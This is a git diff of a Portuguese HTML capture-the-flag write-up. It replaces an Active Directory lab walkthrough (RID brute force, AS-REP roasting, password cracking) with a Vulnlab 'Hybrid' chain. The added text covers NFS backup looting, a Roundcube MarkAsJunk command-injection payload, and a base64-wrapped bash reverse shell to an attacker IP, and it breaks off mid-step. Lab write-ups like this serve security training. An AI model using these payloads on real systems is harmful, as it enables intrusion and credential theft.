@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>WCorp - HC // 0x404</title>
+  <title>Hybrid - Vulnlab // 0x404</title>
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet" />
   <style>
@@ -27,15 +27,9 @@
     }
     html { scroll-behavior: smooth; }
     body { background: var(--black); color: var(--white); font-family: var(--ff-mono); font-size: 15px; line-height: 1.8; overflow-x: hidden; }
-    .grid-bg {
-      position: fixed; inset: 0; z-index: 0; pointer-events: none;
-      background-image: linear-gradient(var(--cyan-dim) 1px, transparent 1px), linear-gradient(90deg, var(--cyan-dim) 1px, transparent 1px);
-      background-size: 48px 48px; opacity: 0.15;
-      mask-image: radial-gradient(ellipse 80% 80% at 50% 50%, black 40%, transparent 100%);
-    }
+    .grid-bg { position: fixed; inset: 0; z-index: 0; pointer-events: none; background-image: linear-gradient(var(--cyan-dim) 1px, transparent 1px), linear-gradient(90deg, var(--cyan-dim) 1px, transparent 1px); background-size: 48px 48px; opacity: 0.15; mask-image: radial-gradient(ellipse 80% 80% at 50% 50%, black 40%, transparent 100%); }
     .scanlines { position: fixed; inset: 0; z-index: 1; pointer-events: none; background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.07) 2px, rgba(0,0,0,0.07) 4px); }
     .vignette { position: fixed; inset: 0; z-index: 2; pointer-events: none; background: radial-gradient(ellipse at center, transparent 50%, #000408bb 100%); }
-
     nav { position: sticky; top: 0; z-index: 100; border-bottom: 1px solid var(--cyan-dim); background: rgba(0,4,8,0.94); backdrop-filter: blur(12px); }
     .nav-inner { max-width: 900px; margin: 0 auto; padding: 0 32px; display: flex; align-items: stretch; justify-content: space-between; height: 52px; }
     .nav-logo { font-family: var(--ff-title); font-size: 14px; font-weight: 700; color: var(--cyan); text-decoration: none; letter-spacing: 0.15em; text-shadow: var(--glow-sm); display: flex; align-items: center; border-right: 1px solid var(--cyan-dim); padding-right: 24px; }
@@ -43,25 +37,75 @@
     .nav-back { display: flex; align-items: center; gap: 8px; color: var(--muted); text-decoration: none; font-size: 11px; letter-spacing: 0.14em; text-transform: uppercase; transition: color .2s; }
     .nav-back:hover { color: var(--cyan); }
     .nav-back::before { content: '←'; font-size: 14px; }
-
     .page { position: relative; z-index: 10; max-width: 900px; margin: 0 auto; padding: 0 32px; }
 
-    /* HEADER */
     .wu-header { padding: 64px 0 48px; border-bottom: 1px solid var(--cyan-dim); margin-bottom: 48px; }
     .wu-meta { display: flex; flex-wrap: wrap; gap: 10px; align-items: center; margin-bottom: 20px; }
     .wu-cat { font-family: var(--ff-title); font-size: 9px; font-weight: 700; letter-spacing: 0.15em; text-transform: uppercase; padding: 4px 12px; border: 1px solid; }
-    .cat-ad { border-color: #ff660055; color: var(--orange); }
+    .cat-chain { border-color: #cc88ff55; color: var(--purple); }
     .wu-date { font-size: 12px; color: var(--muted); letter-spacing: 0.08em; }
     .wu-diff { font-family: var(--ff-title); font-size: 9px; font-weight: 700; letter-spacing: 0.12em; padding: 4px 12px; border: 1px solid; }
-    .diff-hard { border-color: #ff446655; color: var(--red); }
+    .diff-medium { border-color: #ffaa0055; color: #ffaa00; }
     .wu-title { font-family: var(--ff-title); font-size: clamp(24px, 4vw, 40px); font-weight: 900; letter-spacing: 0.04em; line-height: 1.2; color: var(--cyan); text-shadow: var(--glow-md); margin-bottom: 16px; }
     .wu-desc { font-size: 14px; color: var(--muted); max-width: 640px; line-height: 1.8; margin-bottom: 24px; }
     .wu-tags { display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 28px; }
     .tag { font-size: 11px; color: var(--muted); padding: 3px 10px; border: 1px solid #ffffff0f; background: rgba(255,255,255,0.02); }
     .wu-infobar { display: flex; flex-wrap: wrap; gap: 2px; border: 1px solid var(--cyan-dim); }
-    .wu-infobar-item { padding: 10px 20px; background: var(--panel); display: flex; flex-direction: column; gap: 2px; flex: 1; min-width: 120px; }
+    .wu-infobar-item { padding: 10px 20px; background: var(--panel); display: flex; flex-direction: column; gap: 2px; flex: 1; min-width: 100px; }
     .wi-label { font-size: 10px; color: var(--muted); letter-spacing: 0.1em; text-transform: uppercase; }
-    .wi-value { font-family: var(--ff-title); font-size: 13px; font-weight: 700; color: var(--cyan); letter-spacing: 0.06em; }
+    .wi-value { font-family: var(--ff-title); font-size: 12px; font-weight: 700; color: var(--cyan); letter-spacing: 0.04em; }
+
+    /* hosts grid */
+    .hosts-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 2px; margin-bottom: 48px; }
+    .host-card { background: var(--panel); border: 1px solid var(--cyan-dim); padding: 20px 24px; }
+    .host-title { font-family: var(--ff-title); font-size: 12px; font-weight: 700; letter-spacing: 0.1em; color: var(--cyan); text-shadow: var(--glow-sm); margin-bottom: 12px; }
+    .host-ports { display: flex; flex-direction: column; gap: 4px; }
+    .hp { font-size: 12px; color: #8ab4be; display: flex; gap: 10px; }
+    .hp-port { color: var(--orange); min-width: 50px; }
+
+    
+
+    .wu-content { max-width: 760px; }
+    .wu-content h2 { font-family: var(--ff-title); font-weight: 700; font-size: 17px; letter-spacing: 0.08em; text-transform: uppercase; color: var(--cyan); text-shadow: var(--glow-sm); margin: 56px 0 20px; padding-bottom: 10px; border-bottom: 1px solid var(--cyan-dim); display: flex; align-items: center; gap: 12px; }
+    .wu-content h2::before { content: '//'; color: var(--orange); font-size: 14px; }
+    .wu-content h3 { font-family: var(--ff-title); font-size: 13px; font-weight: 700; letter-spacing: 0.1em; color: var(--cyan2); margin: 32px 0 14px; }
+    .wu-content h3::before { content: '> '; color: var(--muted); }
+    .wu-content p { color: #8ab4be; margin-bottom: 14px; line-height: 1.85; }
+    .wu-content strong { color: var(--white); font-weight: 700; }
+    .wu-content em { color: #aaccdd; font-style: italic; }
+    .wu-content a { color: var(--cyan2); text-decoration: none; }
+    .wu-content a:hover { color: var(--cyan); text-shadow: var(--glow-sm); }
+    .wu-content code { font-family: var(--ff-mono); font-size: 13px; color: var(--orange); background: rgba(255,102,0,0.08); padding: 2px 7px; border: 1px solid rgba(255,102,0,0.2); }
+    .wu-content pre { background: #000d16; border: 1px solid var(--cyan-dim); border-left: 3px solid var(--cyan); margin: 20px 0; overflow-x: auto; }
+    .wu-content pre .lang-label { display: block; padding: 6px 16px; background: var(--panel); border-bottom: 1px solid var(--cyan-dim); font-family: var(--ff-title); font-size: 9px; font-weight: 700; letter-spacing: 0.15em; color: var(--cyan2); text-transform: uppercase; }
+    .wu-content pre code { display: block; padding: 18px 20px; background: transparent; border: none; color: #7ecfbf; font-size: 13px; line-height: 1.7; white-space: pre-wrap; word-break: break-all; }
+    .wu-content ul { padding-left: 0; margin-bottom: 14px; list-style: none; }
+    .wu-content ul li { color: #8ab4be; padding: 3px 0 3px 22px; position: relative; }
+    .wu-content ul li::before { content: '▸'; position: absolute; left: 0; color: var(--cyan); font-size: 10px; top: 6px; }
+    .wu-content figure { margin: 28px 0; }
+    .wu-content figure img { max-width: 100%; display: block; border: 1px solid var(--cyan-dim); transition: border-color .2s; }
+    .wu-content figure img:hover { border-color: var(--cyan2); }
+
+    .attack-chain { display: flex; align-items: center; flex-wrap: wrap; gap: 0; margin: 32px 0; }
+    .ac-step { background: var(--panel); border: 1px solid var(--cyan-dim); padding: 10px 14px; font-family: var(--ff-title); font-size: 9px; font-weight: 700; letter-spacing: 0.06em; color: var(--cyan2); text-align: center; flex: 1; min-width: 80px; line-height: 1.5; }
+    .ac-step.highlight { border-color: var(--orange); color: var(--orange); }
+    .ac-step.pivot { border-color: var(--purple); color: var(--purple); }
+    .ac-arrow { color: var(--cyan-dim); font-size: 16px; padding: 0 2px; flex-shrink: 0; }
+
+    .callout-flag { background: rgba(255,68,102,0.06); border: 1px solid rgba(255,68,102,0.3); border-left: 3px solid var(--red); padding: 16px 20px; margin: 20px 0; }
+    .callout-flag .cf-title { font-family: var(--ff-title); font-size: 10px; font-weight: 700; letter-spacing: 0.15em; color: var(--red); margin-bottom: 8px; }
+    .callout-flag p { color: #cc6688; margin: 0; }
+    .callout-flag code { color: var(--red); background: rgba(255,68,102,0.1); border-color: rgba(255,68,102,0.3); }
+    .callout-tip { background: rgba(68,255,136,0.04); border: 1px solid rgba(68,255,136,0.2); border-left: 3px solid var(--green); padding: 16px 20px; margin: 20px 0; }
+    .callout-tip .cf-title { font-family: var(--ff-title); font-size: 10px; font-weight: 700; letter-spacing: 0.15em; color: var(--green); margin-bottom: 8px; }
+    .callout-tip p { color: #44aa66; margin: 0; }
+    .callout-info { background: rgba(0,212,255,0.04); border: 1px solid rgba(0,212,255,0.2); border-left: 3px solid var(--cyan); padding: 16px 20px; margin: 20px 0; }
+    .callout-info .cf-title { font-family: var(--ff-title); font-size: 10px; font-weight: 700; letter-spacing: 0.15em; color: var(--cyan); margin-bottom: 8px; }
+    .callout-info p { color: #3a7a8a; margin: 0; }
+    .callout-info code { color: var(--cyan2); }
+    .callout-warn { background: rgba(255,102,0,0.05); border: 1px solid rgba(255,102,0,0.25); border-left: 3px solid var(--orange); padding: 16px 20px; margin: 20px 0; }
+    .callout-warn .cf-title { font-family: var(--ff-title); font-size: 10px; font-weight: 700; letter-spacing: 0.15em; color: var(--orange); margin-bottom: 8px; }
+    .callout-warn p { color: #aa6633; margin: 0; }
 
     /* ── TOC STICKY ── */
     .toc-wrap {
@@ -77,51 +121,20 @@
     .toc-title { font-family: var(--ff-title); font-size: 9px; font-weight: 700; letter-spacing: 0.15em; text-transform: uppercase; color: var(--orange); white-space: nowrap; }
     .toc ol { list-style: none; counter-reset: toc; display: flex; flex-wrap: wrap; }
     .toc li { counter-increment: toc; }
-    .toc a { color: var(--muted); text-decoration: none; font-size: 11px; display: flex; align-items: center; gap: 5px; padding: 4px 14px 4px 0; transition: color .2s; white-space: nowrap; }
-    .toc a::before { content: counter(toc, decimal-leading-zero) '.'; font-family: var(--ff-title); font-size: 9px; color: var(--cyan-dim); transition: color .2s; }
+    .toc a {
+      color: var(--muted); text-decoration: none;
+      font-size: 11px; display: flex; align-items: center;
+      gap: 5px; padding: 4px 14px 4px 0;
+      transition: color .2s; white-space: nowrap;
+    }
+    .toc a::before {
+      content: counter(toc, decimal-leading-zero) '.';
+      font-family: var(--ff-title); font-size: 9px;
+      color: var(--cyan-dim); transition: color .2s;
+    }
     .toc a:hover { color: var(--cyan2); }
     .toc a.active { color: var(--cyan); }
     .toc a.active::before { color: var(--cyan); }
-    /* CONTENT */
-    .wu-content { max-width: 760px; }
-    .wu-content h2 { font-family: var(--ff-title); font-weight: 700; font-size: 17px; letter-spacing: 0.08em; text-transform: uppercase; color: var(--cyan); text-shadow: var(--glow-sm); margin: 56px 0 20px; padding-bottom: 10px; border-bottom: 1px solid var(--cyan-dim); display: flex; align-items: center; gap: 12px; }
-    .wu-content h2::before { content: '//'; color: var(--orange); font-size: 14px; }
-    .wu-content h3 { font-family: var(--ff-title); font-size: 13px; font-weight: 700; letter-spacing: 0.1em; color: var(--cyan2); margin: 32px 0 14px; }
-    .wu-content h3::before { content: '> '; color: var(--muted); }
-    .wu-content p { color: #8ab4be; margin-bottom: 14px; line-height: 1.85; }
-    .wu-content strong { color: var(--white); font-weight: 700; }
-    .wu-content em { color: #aaccdd; font-style: italic; }
-    .wu-content a { color: var(--cyan2); text-decoration: none; }
-    .wu-content a:hover { color: var(--cyan); text-shadow: var(--glow-sm); }
-    .wu-content code { font-family: var(--ff-mono); font-size: 13px; color: var(--orange); background: rgba(255,102,0,0.08); padding: 2px 7px; border: 1px solid rgba(255,102,0,0.2); }
-    .wu-content pre { background: #000d16; border: 1px solid var(--cyan-dim); border-left: 3px solid var(--cyan); margin: 20px 0; overflow-x: auto; position: relative; }
-    .wu-content pre .lang-label { display: block; padding: 6px 16px; background: var(--panel); border-bottom: 1px solid var(--cyan-dim); font-family: var(--ff-title); font-size: 9px; font-weight: 700; letter-spacing: 0.15em; color: var(--cyan2); text-transform: uppercase; }
-    .wu-content pre code { display: block; padding: 18px 20px; background: transparent; border: none; color: #7ecfbf; font-size: 13px; line-height: 1.7; white-space: pre-wrap; word-break: break-all; }
-    .wu-content ul { padding-left: 0; margin-bottom: 14px; list-style: none; }
-    .wu-content ul li { color: #8ab4be; padding: 3px 0 3px 22px; position: relative; }
-    .wu-content ul li::before { content: '▸'; position: absolute; left: 0; color: var(--cyan); font-size: 10px; top: 6px; }
-    .wu-content figure { margin: 28px 0; }
-    .wu-content figure img { max-width: 100%; display: block; border: 1px solid var(--cyan-dim); transition: border-color .2s; }
-    .wu-content figure img:hover { border-color: var(--cyan2); }
-
-    /* Attack Chain */
-    .attack-chain { display: flex; align-items: center; flex-wrap: wrap; gap: 0; margin: 32px 0; }
-    .ac-step { background: var(--panel); border: 1px solid var(--cyan-dim); padding: 10px 16px; font-family: var(--ff-title); font-size: 10px; font-weight: 700; letter-spacing: 0.08em; color: var(--cyan2); text-align: center; flex: 1; min-width: 100px; }
-    .ac-step.highlight { border-color: var(--orange); color: var(--orange); }
-    .ac-arrow { color: var(--cyan-dim); font-size: 18px; padding: 0 4px; }
-
-    /* Callouts */
-    .callout-flag { background: rgba(255,68,102,0.06); border: 1px solid rgba(255,68,102,0.3); border-left: 3px solid var(--red); padding: 16px 20px; margin: 20px 0; }
-    .callout-flag .cf-title { font-family: var(--ff-title); font-size: 10px; font-weight: 700; letter-spacing: 0.15em; color: var(--red); margin-bottom: 8px; }
-    .callout-flag p { color: #cc6688; margin: 0; }
-    .callout-flag code { color: var(--red); background: rgba(255,68,102,0.1); border-color: rgba(255,68,102,0.3); }
-    .callout-tip { background: rgba(68,255,136,0.04); border: 1px solid rgba(68,255,136,0.2); border-left: 3px solid var(--green); padding: 16px 20px; margin: 20px 0; }
-    .callout-tip .cf-title { font-family: var(--ff-title); font-size: 10px; font-weight: 700; letter-spacing: 0.15em; color: var(--green); margin-bottom: 8px; }
-    .callout-tip p { color: #44aa66; margin: 0; }
-    .callout-info { background: rgba(0,212,255,0.04); border: 1px solid rgba(0,212,255,0.2); border-left: 3px solid var(--cyan); padding: 16px 20px; margin: 20px 0; }
-    .callout-info .cf-title { font-family: var(--ff-title); font-size: 10px; font-weight: 700; letter-spacing: 0.15em; color: var(--cyan); margin-bottom: 8px; }
-    .callout-info p { color: #3a7a8a; margin: 0; }
-    .callout-info code { color: var(--cyan2); }
 
     footer { border-top: 1px solid var(--cyan-dim); padding: 32px 0; margin-top: 40px; display: flex; justify-content: space-between; align-items: center; font-size: 11px; color: var(--muted); letter-spacing: 0.08em; }
     .status-dot { width: 6px; height: 6px; background: var(--green); border-radius: 50%; box-shadow: 0 0 8px var(--green); display: inline-block; margin-right: 8px; animation: pulse 2s ease-in-out infinite; }
@@ -145,12 +158,12 @@
     <div class="toc-title">// Índice</div>
     <ol>
       <li><a href="#recon">Information Gathering</a></li>
-      <li><a href="#smb">SMB & RID Brute Force</a></li>
-      <li><a href="#asrep">AS-REP Roasting</a></li>
-      <li><a href="#kerberoast">Kerberoasting</a></li>
-      <li><a href="#targeted">Targeted Kerberoast</a></li>
-      <li><a href="#forcechange">ForceChangePassword</a></li>
-      <li><a href="#dcsync">DCSync & Admin</a></li>
+      <li><a href="#nfs">Enumeração NFS</a></li>
+      <li><a href="#roundcube">Roundcube RCE</a></li>
+      <li><a href="#lateral">NFS UID Spoofing</a></li>
+      <li><a href="#keepass">KeePass</a></li>
+      <li><a href="#adcs">ADCS ESC1</a></li>
+      <li><a href="#admin">Administrator</a></li>
     </ol>
   </nav>
 </div>
@@ -159,296 +172,337 @@
 
   <header class="wu-header">
     <div class="wu-meta">
-      <span class="wu-cat cat-ad">Active Directory</span>
-      <span class="wu-date">ABR 2025</span>
-      <span class="wu-diff diff-hard">HARD</span>
+      <span class="wu-cat cat-chain">Vulnlab · Chain</span>
+      <span class="wu-date">FEV 2025</span>
+      <span class="wu-diff diff-medium">MEDIUM</span>
     </div>
-    <h1 class="wu-title">WCorp — HC</h1>
+    <h1 class="wu-title">Hybrid — Vulnlab</h1>
     <p class="wu-desc">
-      Comprometimento completo de domínio Active Directory via AS-REP Roasting, Kerberoasting, Targeted Kerberoasting,
-      ForceChangePassword e DCSync. Cadeia de ataque partindo de acesso anônimo SMB até Administrator.
+      Chain com dois hosts: servidor Linux de e-mail (mail01) e Domain Controller Windows (dc01).
+      NFS exposure → backup com credenciais → Roundcube RCE → NFS UID spoofing → KeePass →
+      ADCS ESC1 via keytab da conta de máquina → Administrator.
     </p>
     <div class="wu-tags">
-      <span class="tag">AS-REP Roasting</span>
-      <span class="tag">Kerberoasting</span>
-      <span class="tag">IDOR</span>
-      <span class="tag">GenericWrite</span>
-      <span class="tag">ForceChangePassword</span>
-      <span class="tag">DCSync</span>
-      <span class="tag">BloodHound</span>
-      <span class="tag">Windows AD</span>
+      <span class="tag">NFS</span>
+      <span class="tag">Roundcube RCE</span>
+      <span class="tag">UID Spoofing</span>
+      <span class="tag">KeePass</span>
+      <span class="tag">ADCS ESC1</span>
+      <span class="tag">Certipy</span>
+      <span class="tag">PKINIT</span>
+      <span class="tag">Chain</span>
     </div>
     <div class="wu-infobar">
       <div class="wu-infobar-item">
         <span class="wi-label">Plataforma</span>
-        <span class="wi-value">HackClub</span>
+        <span class="wi-value">Vulnlab</span>
       </div>
       <div class="wu-infobar-item">
-        <span class="wi-label">OS</span>
-        <span class="wi-value">Windows</span>
+        <span class="wi-label">Tipo</span>
+        <span class="wi-value">Chain</span>
       </div>
       <div class="wu-infobar-item">
-        <span class="wi-label">IP Alvo</span>
-        <span class="wi-value">172.16.11.181</span>
+        <span class="wi-label">Host 1</span>
+        <span class="wi-value">10.10.243.181</span>
       </div>
       <div class="wu-infobar-item">
-        <span class="wi-label">Domínio</span>
-        <span class="wi-value">wcorp.hc</span>
+        <span class="wi-label">Host 2</span>
+        <span class="wi-value">10.10.243.182</span>
       </div>
       <div class="wu-infobar-item">
         <span class="wi-label">Data</span>
-        <span class="wi-value">19 ABR 2025</span>
+        <span class="wi-value">28 FEV 2025</span>
       </div>
     </div>
   </header>
 
   <!-- ATTACK CHAIN -->
   <div class="attack-chain">
-    <div class="ac-step">Guest SMB</div>
+    <div class="ac-step">NFS<br>Anônimo</div>
     <span class="ac-arrow">→</span>
-    <div class="ac-step">svc_backup<br><small>AS-REP</small></div>
+    <div class="ac-step">Backup<br>Credenciais</div>
     <span class="ac-arrow">→</span>
-    <div class="ac-step">svc_web<br><small>Kerberoast</small></div>
+    <div class="ac-step">Roundcube<br>RCE</div>
     <span class="ac-arrow">→</span>
-    <div class="ac-step">john.doe<br><small>GenericWrite</small></div>
+    <div class="ac-step pivot">NFS UID<br>Spoof</div>
     <span class="ac-arrow">→</span>
-    <div class="ac-step">diana.ops<br><small>ForceChangePwd</small></div>
+    <div class="ac-step">KeePass<br>peter.turner</div>
     <span class="ac-arrow">→</span>
-    <div class="ac-step highlight">Administrator<br><small>DCSync</small></div>
+    <div class="ac-step">keytab<br>MAIL01$</div>
+    <span class="ac-arrow">→</span>
+    <div class="ac-step highlight">ADCS ESC1<br>Administrator</div>
   </div>
 
   <div class="wu-content">
 
-    <h2 id="recon">Information Gathering</h2>
+    <h2 id="recon">Information Gathering — Dois Hosts</h2>
 
-    <h3>Portscan</h3>
-    <p>Iniciamos com a enumeração de portas e serviços ativos no ambiente alvo.</p>
+    <h3>Host 1 — DC01 (10.10.243.181)</h3>
+    <p>Escopo com dois IPs. Iniciamos pelo primeiro host, identificado como Domain Controller do domínio <code>hybrid.vl</code>.</p>
 
-    <pre><span class="lang-label">bash</span><code>$ bash ~/tools/enumport/script.sh 172.16.11.181
-Enumerando portas....
-Portas abertas: 53,88,135,139,389,445,593,636,3269,3389,5985,9389,...
-Verificando Serviços
+    <pre><span class="lang-label">bash</span><code>$ sudo nmap --open -Pn -p53,88,135,139,389,445,464,636,3268,3269,3389,5985,9389 \
+  -sVC --min-rate 600 10.10.243.181
 
-PORT      STATE SERVICE       VERSION
-53/tcp    open  domain        Simple DNS Plus
-88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
-389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
-                              (Domain: wcorp.hc0., Site: Default-First-Site-Name)
-445/tcp   open  microsoft-ds?
-3389/tcp  open  ms-wbt-server Microsoft Terminal Services
-5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
+                             (Domain: hybrid.vl0.)
+445/tcp  open  microsoft-ds?
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
 | rdp-ntlm-info:
-|   Target_Name: WCORP
-|   DNS_Domain_Name: wcorp.hc
-|   DNS_Computer_Name: dc-01.wcorp.hc
-|_  Product_Version: 10.0.20348
+|   Target_Name: HYBRID
+|   DNS_Domain_Name: hybrid.vl
+|   DNS_Computer_Name: dc01.hybrid.vl
+|_  Product_Version: 10.0.20348</code></pre>
 
-Nmap done: 1 IP address (1 host up) scanned in 110.29 seconds</code></pre>
+    <pre><span class="lang-label">bash</span><code>$ echo '10.10.243.181 hybrid.vl dc01.hybrid.vl' | sudo tee -a /etc/hosts</code></pre>
 
-    <p><strong>Obs</strong>: Script personalizado de enumeração: <a href="https://github.com/fstringuetta/enumport" target="_blank">github.com/fstringuetta/enumport</a></p>
+    <h3>Host 2 — mail01 (10.10.243.182)</h3>
+    <p>Segundo host com perfil completamente diferente — Linux com serviços de e-mail e NFS exposto.</p>
 
-    <h3>Configuração do arquivo hosts</h3>
-    <pre><span class="lang-label">bash</span><code>$ echo '172.16.11.181 wcorp.hc dc-01.wcorp.hc' | sudo tee -a /etc/hosts</code></pre>
+    <pre><span class="lang-label">bash</span><code>$ sudo nmap --open -sVC -Pn -p22,25,80,110,111,143,587,993,995,2049 \
+  --min-rate 1280 10.10.243.182
 
-    <h2 id="smb">Enumeração SMB & RID Brute Force</h2>
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu
+25/tcp   open  smtp     Postfix smtpd
+80/tcp   open  http     nginx 1.18.0 (Ubuntu)
+110/tcp  open  pop3     Dovecot pop3d
+111/tcp  open  rpcbind  2-4 (RPC #100000)
+143/tcp  open  imap     Dovecot imapd (Ubuntu)
+2049/tcp open  nfs      3-4 (RPC #100003)   ← NFS exposto!
+Service Info: Host: mail01.hybrid.vl; OS: Linux</code></pre>
 
-    <p>Com o SMB ativo, realizamos tentativa de acesso com credenciais de convidado para identificar permissões indevidas em compartilhamentos.</p>
+    <pre><span class="lang-label">bash</span><code>$ echo '10.10.243.182 mail01.hybrid.vl' | sudo tee -a /etc/hosts</code></pre>
 
-    <pre><span class="lang-label">bash</span><code>$ netexec smb 172.16.11.181 -u guest -p '' --shares
-SMB  172.16.11.181  445  DC-01  [+] wcorp.hc\guest:
-SMB  172.16.11.181  445  DC-01  Share        Permissions  Remark
-SMB  172.16.11.181  445  DC-01  -----        -----------  ------
-SMB  172.16.11.181  445  DC-01  ADMIN$                    Remote Admin
-SMB  172.16.11.181  445  DC-01  C$                        Default share
-SMB  172.16.11.181  445  DC-01  IPC$         READ         Remote IPC
-SMB  172.16.11.181  445  DC-01  NETLOGON                  Logon server share
-SMB  172.16.11.181  445  DC-01  SYSVOL                    Logon server share</code></pre>
+    <figure><img src="imgs/2025-02-28_07-57.png" alt="Roundcube Webmail identificado na porta 80" /></figure>
 
-    <div class="callout-info">
-      <div class="cf-title">ℹ RID Brute Force</div>
-      <p>A conta <code>guest</code> está habilitada com permissão de leitura no IPC$. Isso permite enumerar usuários do domínio via RID Brute Forcing com o parâmetro <code>--rid-brute</code>.</p>
-    </div>
+    <h2 id="nfs">Enumeração NFS — Backup com Credenciais</h2>
 
-    <pre><span class="lang-label">bash</span><code>$ netexec smb 172.16.11.181 -u 'guest' -p '' --rid-brute 2>/dev/null \
-  | grep 'SidTypeUser' | awk -F '\\' '{print $2}' | awk '{print $1}'
+    <p>Com o NFS rodando na porta 2049, verificamos os diretórios compartilhados:</p>
 
-Administrator
-Guest
-krbtgt
-DC-01$
-john.doe
-alice.hr
-bob.finance
-charlie.dev
-diana.ops
-svc_backup
-svc_web</code></pre>
+    <pre><span class="lang-label">bash</span><code>$ showmount -e 10.10.243.182
+Export list for 10.10.243.182:
+/opt/share *</code></pre>
 
-    <figure><img src="imgs/2025-04-19_19-55.png" alt="RID Brute Force enumerando usuários do domínio" /></figure>
+    <p>Montamos o compartilhamento e encontramos um arquivo de backup:</p>
 
-    <h2 id="asrep">AS-REP Roasting — svc_backup</h2>
-
-    <p>Com a lista de usuários em mãos, identificamos duas contas de serviço: <code>svc_backup</code> e <code>svc_web</code>. Verificamos a presença da flag <strong>Do not require Kerberos preauthentication</strong> usando o <code>GetNPUsers.py</code> do Impacket.</p>
-
-    <pre><span class="lang-label">bash</span><code>$ GetNPUsers.py wcorp.hc/guest -no-pass -dc-ip 172.16.11.181 \
-  -usersfile users.txt -outputfile hashes
-
-[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User john.doe doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User diana.ops doesn't have UF_DONT_REQUIRE_PREAUTH set
-$krb5asrep$23$svc_backup@WCORP.HC:d1c7e43b9d22ee883593a84c4c26a64a$...
-[-] User svc_web doesn't have UF_DONT_REQUIRE_PREAUTH set</code></pre>
-
-    <p>Hash AS-REP obtido para <code>svc_backup</code>! Executamos o ataque de força bruta com John:</p>
-
-    <pre><span class="lang-label">bash</span><code>$ john -w=/usr/share/wordlists/rockyou.txt --format=krb5asrep hashes-krb5
-
-LuvinJames&lt;3     ($krb5asrep$23$svc_backup@WCORP.HC)
-1g 0:00:00:14 DONE (2025-04-19 17:29) 0.07017g/s 764874p/s</code></pre>
+    <pre><span class="lang-label">bash</span><code>$ sudo mount -t nfs -o nfsvers=3 10.10.243.182:/opt/share nfs/
+$ tar -xvf backup.tar.gz
+etc/passwd
+etc/sssd/sssd.conf
+etc/dovecot/dovecot-users
+etc/postfix/main.cf
+opt/certs/hybrid.vl/fullchain.pem
+opt/certs/hybrid.vl/privkey.pem</code></pre>
 
     <div class="callout-tip">
-      <div class="cf-title">✓ Credenciais Obtidas</div>
-      <p><code>svc_backup</code> : <code>LuvinJames&lt;3</code></p>
+      <div class="cf-title">✓ Credenciais no backup</div>
+      <p><code>admin@hybrid.vl</code> : <code>Duckling21</code><br>
+      <code>peter.turner@hybrid.vl</code> : <code>PeterIstToll!</code></p>
     </div>
 
-    <figure><img src="imgs/image.png" alt="Validação das credenciais svc_backup com netexec" /></figure>
+    <figure><img src="imgs/2025-02-28_12-01.png" alt="Conteúdo do arquivo dovecot-users" /></figure>
 
-    <p>Com as credenciais validadas, enumeramos todos os usuários do AD e obtemos a <strong>primeira evidência</strong>.</p>
+    <h2 id="roundcube">Acesso Roundcube & RCE (MarkAsJunk)</h2>
 
-    <pre><span class="lang-label">bash</span><code>$ netexec smb 172.16.11.181 -u 'svc_backup' -p 'LuvinJames&lt;3' --users</code></pre>
+    <p>Com as credenciais obtidas, acessamos o Roundcube Webmail. Durante a enumeração manual dos e-mails, identificamos a versão do plugin instalado na aplicação.</p>
+
+    <figure><img src="imgs/2025-02-28_12-19.png" alt="Roundcube autenticado — plugin identificado" /></figure>
+
+    <div class="callout-info">
+      <div class="cf-title">ℹ CVE — Roundcube MarkAsJunk RCE</div>
+      <p>O plugin <strong>MarkAsJunk</strong> é vulnerável a injeção de comandos via o campo de remetente do e-mail. Referência: <a href="https://ssd-disclosure.com/ssd-advisory-roundcube-markasjunk-rce/" target="_blank">SSD Advisory</a></p>
+    </div>
+
+    <h3>Prova de Conceito — ICMP</h3>
+    <p>Alteramos o remetente via <code>Settings → Identities</code> para injetar um comando ping:</p>
+
+    <pre><span class="lang-label">payload</span><code>admin&ping${IFS}-c2${IFS}10.8.3.97&@hybrid.vl</code></pre>
+
+    <figure><img src="imgs/2025-02-28_12-23.png" alt="Configurando identidade maliciosa no Roundcube" /></figure>
+
+    <div class="callout-warn">
+      <div class="cf-title">⚠ Atenção</div>
+      <p>O plugin trata e-mails como SPAM — é necessário clicar no botão <strong>Junk</strong> para acionar a execução do comando.</p>
+    </div>
+
+    <figure><img src="imgs/2025-02-28_12-31.png" alt="ICMP recebido — RCE confirmado" /></figure>
+
+    <h3>Reverse Shell</h3>
+    <p>Com o RCE confirmado, encodamos o payload em base64 para evitar problemas com caracteres especiais:</p>
+
+    <pre><span class="lang-label">bash</span><code>$ echo -n 'bash -i >& /dev/tcp/10.8.3.97/9001 0>&1' | base64
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjMuOTcvOTAwMSAwPiYx</code></pre>
+
+    <pre><span class="lang-label">payload</span><code>admin&echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjMuOTcvOTAwMSAwPiYx|base64${IFS}-d|${IFS}bash&@hybrid.vl</code></pre>
+
+    <figure><img src="imgs/2025-02-28_12-40.png" alt="Reverse shell recebida" /></figure>
+
+    <h2 id="lateral">Movimentação Lateral via NFS UID Spoofing</h2>
+
+    <p>Com acesso ao servidor, verificamos que não temos permissão para ler o diretório do usuário <code>peter.turner</code>. Identificamos o UID do usuário:</p>
+
+    <pre><span class="lang-label">bash</span><code>$ id peter.turner@hybrid.vl
